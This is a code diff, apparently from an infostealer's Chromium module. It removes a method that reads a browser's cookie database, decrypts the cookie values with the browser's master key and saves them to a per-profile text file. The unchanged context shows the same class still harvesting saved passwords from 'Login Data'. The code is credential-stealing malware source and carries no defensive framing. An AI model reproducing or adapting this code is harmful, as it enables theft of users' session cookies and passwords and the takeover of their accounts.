@@ -250,43 +250,6 @@ class Chromium:
             "".join(item for item in set(temp)),
         )
 
-    def _grab_cookies(self, profile: str, file_path: str) -> None:
-        """
-        Collects browser cookies.
-
-        Parameters:
-        - profile [str]: Browser profile.
-        - main_path [str]: Path of the file to be processed.
-        - alt_path [str]: Spare path of the file to be processed.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(file_path):
-            return
-
-        cursor, connection = self._get_db_connection(file_path)
-        cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()
-
-        cursor.close()
-        connection.close()
-
-        if not cookies_list:
-            return
-
-        cookies_list_filtered = [row for row in cookies_list if row[0] != ""]
-
-        data = self.__config.CookiesData
-        temp = [
-            data.format(row[0], row[1], self._decrypt(row[2], self.__master_key))
-            for row in cookies_list_filtered
-        ]
-
-        self.__storage.add_from_memory(
-            path.join(self.__path, rf"{profile} Cookies.txt"),
-            "\n".join(row for row in temp),
-        )
-
     def _process_profile(self, profile: str) -> None:
         """
         Collects browser profile data.
@@ -303,11 +266,6 @@ class Chromium:
                 "method": self._grab_passwords,
                 "arguments": [profile_name, path.join(profile, "Login Data")],
                 "status": True if Features.passwords in self.__statuses else False,
-            },
-            {
-                "method": self._grab_cookies,
-                "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
-                "status": True if Features.cookies in self.__statuses else False,
             },
         ]
 
